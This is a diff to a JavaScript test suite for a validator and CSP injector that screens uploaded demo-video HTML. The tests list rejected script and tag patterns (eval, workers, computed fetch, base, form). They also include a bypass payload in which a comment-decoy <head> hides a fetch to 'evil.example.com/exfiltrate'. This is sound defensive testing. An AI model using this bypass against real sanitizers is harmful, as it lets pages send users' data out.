@@ -206,21 +206,22 @@ test('valid demo-video html is written atomically to project-pages/demo-video/in
   const target = path.join(fs.realpathSync(cwd), 'session-manager-operations', 'project-pages', 'demo-video', 'index.html');
   expect(body.path).toBe(target);
   const written = fs.readFileSync(target, 'utf8');
-  const headMatch = written.match(/<head[^>]*>([\s\S]*)/i);
-  expect(headMatch).toBeTruthy();
-  expect(headMatch[1].startsWith(DEMO_VIDEO_CSP)).toBe(true);
+  expect(written.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
 
   const homeTarget = path.join(fs.realpathSync(cwd), 'session-manager-operations', 'project-pages', 'home.html');
   expect(fs.readFileSync(homeTarget, 'utf8')).toBe(GOOD_HTML);
 });
 
-test('injectCsp creates <head> when absent and replaces an existing CSP meta', () => {
-  const noHead = injectCsp('<html><body>x</body></html>');
-  expect(noHead).toBe(`<html><head>${DEMO_VIDEO_CSP}</head><body>x</body></html>`);
+test('injectCsp always puts the CSP meta first after a fresh doctype, replacing any existing CSP meta and leading doctype', () => {
+  const noDoctype = injectCsp('<html><body>x</body></html>');
+  expect(noDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><body>x</body></html>`);
 
   const existingCsp = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><title>t</title></head><body>x</body></html>';
   const replaced = injectCsp(existingCsp);
-  expect(replaced).toBe(`<html><head>${DEMO_VIDEO_CSP}<title>t</title></head><body>x</body></html>`);
+  expect(replaced).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);
+
+  const withDoctype = injectCsp('<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>');
+  expect(withDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);
 });
 
 test.each([
@@ -243,6 +244,15 @@ test.each([
   ['missing duration meta', '<html><head></head><body><p>x</p></body></html>'],
   ['duration 31 (above range)', '<html><head><meta name="sm-demo-duration" content="31"></head><body><p>x</p></body></html>'],
   ['duration 4 (below range)', '<html><head><meta name="sm-demo-duration" content="4"></head><body><p>x</p></body></html>'],
+  ['computed window["fetch"] access', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>window["fetch"]("/x")</script></body></html>`],
+  ['Worker(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Worker("x.js")</script></body></html>`],
+  ['SharedWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new SharedWorker("x.js")</script></body></html>`],
+  ['serviceWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>navigator.serviceWorker.register("x.js")</script></body></html>`],
+  ['rel=preload', `<html><head><meta name="sm-demo-duration" content="10"></head><body><link rel="preload" href="x.png"></body></html>`],
+  ['eval(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>eval("1+1")</script></body></html>`],
+  ['Function(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Function("return 1")()</script></body></html>`],
+  ['<base', `<html><head><meta name="sm-demo-duration" content="10"><base href="/"></head><body>x</body></html>`],
+  ['<form', `<html><head><meta name="sm-demo-duration" content="10"></head><body><form></form></body></html>`],
 ])('rejects %s with 400 and writes nothing', async (_label, html) => {
   const cwd = await mkProjectCwd();
   const adminHttp = makeFakeAdminHttp();
@@ -274,4 +284,34 @@ test('validateDemoVideoHtml accepts GOOD_DEMO_VIDEO_HTML and exact-boundary dura
   expect(validateDemoVideoHtml(GOOD_DEMO_VIDEO_HTML)).toBeNull();
   expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="5"></head><body>x</body></html>')).toBeNull();
   expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="30"></head><body>x</body></html>')).toBeNull();
+});
+
+test('validateDemoVideoHtml accepts a legitimate requestAnimationFrame/canvas demo', () => {
+  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="12"></head>'
+    + '<body><canvas id="c" width="200" height="100"></canvas><script>'
+    + 'const ctx = document.getElementById("c").getContext("2d");'
+    + 'let x = 0;'
+    + 'const draw = () => { ctx.clearRect(0,0,200,100); ctx.fillRect(x,0,10,10); x = (x+1)%200; requestAnimationFrame(draw); };'
+    + 'requestAnimationFrame(draw);'
+    + '</script></body></html>';
+  expect(validateDemoVideoHtml(html)).toBeNull();
+});
+
+test("validateDemoVideoHtml rejects the validator's demonstrated bypass: comment-decoy <head> + computed window[\"fetch\"]", () => {
+  const exploit = '<!DOCTYPE html><html>'
+    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
+    + '<body><meta name="sm-demo-duration" content="10">'
+    + '<script>window["fetch"]("https://evil.example.com/exfiltrate")</script>'
+    + '</body></html>';
+  const rejection = validateDemoVideoHtml(exploit);
+  expect(rejection).not.toBeNull();
+  expect(rejection).toMatch(/network-capable/);
+});
+
+test('injectCsp places the CSP meta immediately after the doctype even with a comment-decoy <head>', () => {
+  const decoy = '<!DOCTYPE html><html>'
+    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
+    + '<body><p>hello</p></body></html>';
+  const result = injectCsp(decoy);
+  expect(result.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
 });
